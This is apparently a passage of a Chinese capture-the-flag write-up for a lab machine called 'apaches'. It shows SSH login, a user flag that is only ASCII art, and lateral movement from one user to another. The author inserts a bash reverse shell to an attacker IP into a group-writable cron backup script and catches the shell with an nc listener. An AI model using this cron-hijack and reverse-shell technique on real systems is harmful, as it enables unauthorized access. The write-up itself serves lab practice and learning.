                                                                       <span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>      <span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>       <span class="token operator">>=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>       <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> 
                                                                      <span class="token operator">>></span> <span class="token operator">>=</span><span class="token operator">></span>     <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>     <span class="token operator">>></span> <span class="token operator">>=</span><span class="token operator">></span>     <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>       
                          ~                                          <span class="token operator">>=</span><span class="token operator">></span>  <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>  <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>     
                    <span class="token number">7</span>~   ~<span class="token operator">&amp;</span><span class="token builtin class-name">.</span>                                        <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>          <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>             <span class="token operator">>=</span><span class="token operator">></span>  
                    G<span class="token operator">!</span>J <span class="token operator">!</span><span class="token number">75</span><span class="token operator">!</span>   ~G     <span class="token builtin class-name">:</span>                            <span class="token operator">>=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>  <span class="token operator">>=</span><span class="token operator">></span>         <span class="token operator">>=</span><span class="token operator">></span>      <span class="token operator">>=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>       <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> 
                   ?~:B<span class="token operator">!</span>. 5Y^<span class="token operator">!</span>~^B. :~J<span class="token operator">&amp;</span>                           <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>        <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">></span>    <span class="token operator">>=</span><span class="token operator">></span> <span class="token operator">>=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>   <span class="token operator">>=</span><span class="token operator">>></span><span class="token operator">=</span><span class="token operator">></span>
                 .GG?~    B^<span class="token punctuation">..</span>.PB?<span class="token operator">!</span>^ ?5 <span class="token builtin class-name">.</span>                         
                <span class="token number">7</span><span class="token operator">&amp;</span>G:  <span class="token number">7</span>. JB7?7^<span class="token punctuation">..</span>   ^<span class="token operator">&amp;</span>P<span class="token operator">&amp;</span>Y .7<span class="token comment">#                     If at first you don't succeed. Try, try again! Sometimes the second time returns more!</span>
              .GG.  ~J. ?@5:  :~.  Y@@@@??<span class="token operator">!</span>?<span class="token comment">#                     </span>
             <span class="token builtin class-name">:</span><span class="token comment">#~  ~Y~  JJ  :77: .J&amp;@#57:  :&amp;!.~Y  .:              </span>
            <span class="token builtin class-name">:</span><span class="token operator">&amp;</span><span class="token builtin class-name">.</span> ^P7  ^J::<span class="token operator">!</span><span class="token number">7</span>^.:<span class="token operator">!</span>YJ<span class="token operator">!</span>:<span class="token punctuation">..</span><span class="token punctuation">..</span>  Y@@@@@<span class="token operator">&amp;</span>J5@<span class="token operator">!</span>              
            @7 Y5  :GP77~::~<span class="token operator">!</span>~<span class="token punctuation">..</span>.:^:<span class="token punctuation">..</span>:J<span class="token comment">#&amp;#GPJ!:.PG               </span>
           P@~B<span class="token comment"># ^B@G~^^!!~^^^^:...^7J7.       ^BP^?:             </span>
          ^@@@@@<span class="token operator">&amp;</span>@<span class="token comment">#~7G5J7~::.:^~?JJ7~::^^~~~?B@@@@@&amp;              </span>
          <span class="token operator">&amp;</span>J<span class="token operator">!</span><span class="token number">7</span>?P<span class="token comment">#@B@@@B!:!?77???7!~~!!?J5PPP5YJ??YPYJ~.           </span>
         ?P       :?B@<span class="token operator">&amp;</span><span class="token comment">#@#?7!^^~?55Y7^:..       .^?J5Y^           </span>
         ?B^^^::<span class="token punctuation">..</span>    ~G<span class="token operator">&amp;</span>@<span class="token comment">#YP#&amp;@B!....::::^~75B&amp;@@@@#G!           </span>
         <span class="token builtin class-name">:</span><span class="token operator">&amp;</span>~J?P<span class="token operator">&amp;</span>@@G?7<span class="token operator">!</span>^<span class="token punctuation">..</span>BG<span class="token operator">!</span>~7B@<span class="token comment">#5J7!!7?JPGBB#BB&amp;&amp;@@B^            </span>
         <span class="token operator">!</span><span class="token number">5</span> <span class="token comment">##J?PY    :JP&amp;    .@&amp;G5JY5GG57^:...   .~YBJ           </span>
        ~5  :P7<span class="token operator">!</span>^ <span class="token punctuation">..</span>^   ~@P~~~BB7^:.  .:~5G<span class="token operator">!</span> .:<span class="token operator">!</span>5B<span class="token operator">&amp;</span>@G<span class="token operator">!</span><span class="token operator">!</span>.          
       .P      ~PGB<span class="token comment">#5   P:5!B&amp;7~:Y&amp;#&amp;B&amp;&amp;#GPY7!!?5B@@&amp;G:           </span>
       Y7   ^^ .5GGB<span class="token operator">!</span>  <span class="token number">5</span>~<span class="token operator">!</span><span class="token number">7</span>:7<span class="token operator">!</span>G:. 7B7?~^^?G<span class="token comment">#P!....:GP             </span>
       .~^JJ^   <span class="token builtin class-name">.</span>     .G <span class="token comment">#..J ##!  J#~..:.  .7P#?^:.              </span>
          <span class="token operator">!</span>Y:^. ?.    ~Y <span class="token operator">&amp;</span>  <span class="token number">7</span> PJ<span class="token operator">!</span>P7^@@<span class="token operator">&amp;</span>Y<span class="token operator">!</span>^^.  .J<span class="token operator">&amp;</span>Y                
           P<span class="token operator">!</span>         ~P @. <span class="token builtin class-name">:</span> Y<span class="token operator">&amp;</span>  5GPJ<span class="token comment">#??~~?#G!!!7.               </span>
           <span class="token operator">!</span>?       ^?J<span class="token operator">&amp;</span><span class="token builtin class-name">.</span><span class="token comment">#J   B##: .  B7:.   5^                   </span>
            <span class="token operator">!</span><span class="token operator">!</span>^.:<span class="token operator">!</span>PP^  <span class="token operator">!</span>G<span class="token operator">!</span><span class="token operator">&amp;</span><span class="token builtin class-name">.</span>  <span class="token number">5</span>^7?J   ?<span class="token comment">#:~~^.:B^                  </span>
              .::<span class="token punctuation">..</span><span class="token operator">!</span>?   .<span class="token operator">!</span>JG. <span class="token operator">&amp;</span>^  BG~.:@       <span class="token builtin class-name">.</span>                  
                    JG<span class="token operator">!</span><span class="token operator">!</span>^<span class="token punctuation">..</span>5YYG5^ <span class="token operator">&amp;</span><span class="token punctuation">..</span>~Y<span class="token operator">&amp;</span>                          
                   .G<span class="token punctuation">..</span>.^?~  <span class="token builtin class-name">.</span>  JB<span class="token operator">!</span>    <span class="token builtin class-name">.</span>                          
                   .G<span class="token operator">!</span><span class="token number">7</span><span class="token operator">!</span>:                                   
                   
squanto@192.168.56.159's password: 
Welcome to Ubuntu <span class="token number">20.04</span> LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.4</span>.0-128-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue <span class="token number">23</span> Apr <span class="token number">2024</span> <span class="token number">10</span>:30:40 AM UTC

  System load:  <span class="token number">0.8</span>                Processes:               <span class="token number">118</span>
  Usage of /:   <span class="token number">20.3</span>% of <span class="token number">39</span>.07GB   Users logged in:         <span class="token number">0</span>
  Memory usage: <span class="token number">14</span>%                IPv4 address <span class="token keyword">for</span> enp0s3: <span class="token number">192.168</span>.56.159
  Swap usage:   <span class="token number">0</span>%


<span class="token number">143</span> updates can be installed immediately.
<span class="token number">2</span> of these updates are security updates.
To see these additional updates run: <span class="token function">apt</span> list <span class="token parameter variable">--upgradable</span>

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr <span class="token number">23</span> 09:49:22 <span class="token number">2024</span> from <span class="token number">127.0</span>.0.1
squanto@apaches:~$ </code></pre>
<p>user.txt没有什么东西,只有赞赏😄</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">squanto@apaches:~$ <span class="token function">cat</span> user.txt 
  ______ _                      __                               _        
 <span class="token operator">|</span>  ____<span class="token operator">|</span> <span class="token operator">|</span>                    / _<span class="token operator">|</span>                             <span class="token operator">|</span> <span class="token operator">|</span>       
 <span class="token operator">|</span> <span class="token operator">|</span>__  <span class="token operator">|</span> <span class="token operator">|</span> __ _  __ _    ___ <span class="token operator">|</span> <span class="token operator">|</span>_   ___  __ _ _   _  __ _ _ __ <span class="token operator">|</span> <span class="token operator">|</span>_ ___  
 <span class="token operator">|</span>  __<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>/ _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span>/ _<span class="token variable">`</span></span> <span class="token operator">|</span>  / _ <span class="token punctuation">\</span><span class="token operator">|</span>  _<span class="token operator">|</span> / __<span class="token operator">|</span>/ _<span class="token variable"><span class="token variable">`</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>/ _<span class="token variable">`</span></span> <span class="token operator">|</span> '_ <span class="token punctuation">\</span><span class="token operator">|</span> __/ _ <span class="token punctuation">\</span> 
 <span class="token operator">|</span> <span class="token operator">|</span>    <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>
 <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span>  <span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>   <span class="token operator">|</span>___/<span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token punctuation">\</span>___/ 
                  __/ <span class="token operator">|</span>                     <span class="token operator">|</span> <span class="token operator">|</span>                           
                 <span class="token operator">|</span>___/                      <span class="token operator">|</span>_<span class="token operator">|</span>                           
@@@@@@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@@<span class="token operator">&amp;&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>%<span class="token operator">&amp;</span>%<span class="token comment">#%%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token comment">#%%%%&amp;&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>%<span class="token comment">#(%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token comment">#((#%#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>%<span class="token punctuation">((</span>//<span class="token punctuation">..</span><span class="token punctuation">(</span>*,/,,*.%<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>
@@@@<span class="token operator">&amp;</span>@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span><span class="token comment">##%#(/&amp;&amp;&amp;&amp;&amp;%#//,    &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">((</span><span class="token punctuation">((</span>*<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>%<span class="token operator">&amp;</span>%%<span class="token comment">#%((/((  ./&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>%<span class="token punctuation">((</span><span class="token punctuation">(</span>//<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span><span class="token comment">#/#(/*//(/(  ..&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token comment">#(//%%&amp;&amp;*../%(,.*. .(/(  ..&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>//*<span class="token punctuation">(</span><span class="token operator">&amp;&amp;</span>%%<span class="token comment">#/#%&amp;&amp;//**(//(//  .&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@@@@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>,,*<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>%%<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>/,<span class="token punctuation">((</span><span class="token punctuation">((</span>//<span class="token punctuation">(</span>   /<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>
@@@@@@@@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>.  <span class="token comment">##%&amp;&amp;/&amp;&amp;(#*,. /,/////   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>,  %<span class="token comment">##%%&amp;&amp;&amp;/**.,**//(///,#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@@@<span class="token operator">&amp;&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>,/%%%<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>%<span class="token punctuation">((</span>**//*/<span class="token punctuation">(</span>/  /<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>
@@@@@@@@@@<span class="token operator">&amp;&amp;</span>@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>%*,.<span class="token comment">#%#&amp;&amp;&amp;#*////**.     .%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>%<span class="token comment">#&amp;** /%#/*,(..,..       ...*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@@@<span class="token operator">&amp;</span>@@@<span class="token operator">&amp;</span>@@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span><span class="token operator">&amp;&amp;</span>@@<span class="token operator">&amp;</span><span class="token comment">#/.**%&amp;%##(*,.    ..   .,//&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>
@@@@@@@@@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@<span class="token operator">&amp;</span>@@<span class="token operator">&amp;&amp;</span>@@<span class="token operator">&amp;&amp;</span>@<span class="token operator">&amp;&amp;</span><span class="token operator">&amp;</span>%<span class="token punctuation">(</span> %%<span class="token punctuation">(</span><span class="token operator">&amp;</span>%<span class="token operator">&amp;</span>%<span class="token comment">#((%%**@*,.,.,,//,&amp;&amp;&amp;&amp;&amp;&amp;@&amp;&amp;@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span>

Well done<span class="token operator">!</span></code></pre>
<p>登上去我就想看看能不能修改定时任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">squanto@apaches:/home/sacagawea/Scripts$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxrwxr-x <span class="token number">2</span> sacagawea sacagawea <span class="token number">4096</span> Oct <span class="token number">10</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">7</span> sacagawea sacagawea <span class="token number">4096</span> Apr <span class="token number">23</span> <span class="token number">10</span>:00 <span class="token punctuation">..</span>
-rwxrwx--- <span class="token number">1</span> sacagawea Lipan      <span class="token number">232</span> Apr <span class="token number">23</span> 09:56 backup.sh
squanto@apaches:/home/sacagawea/Scripts$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>squanto<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>squanto<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>squanto<span class="token punctuation">)</span>,1004<span class="token punctuation">(</span>Lipan<span class="token punctuation">)</span></code></pre>
<p>发现正好在同一个组，那就有权限修改，在backup.sh里面弹个shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">squanto@apaches:/home/sacagawea/Scripts$ <span class="token function">cat</span> backup.sh 
<span class="token comment">#!/bin/bash</span>

/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.56.104/4567 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /home/sacagawea/Backup/Backup.tar.gz
<span class="token function">tar</span> <span class="token parameter variable">-czvf</span> /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
<span class="token function">chmod</span> <span class="token number">700</span> /home/sacagawea/Backup/Backup.tar.gz</code></pre>
<p>然后kali开个监听端口等就行了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.159<span class="token punctuation">]</span> <span class="token number">40226</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">2903</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
sacagawea@apaches:~$ <span class="token function">id</span>
<span class="token function">id</span>
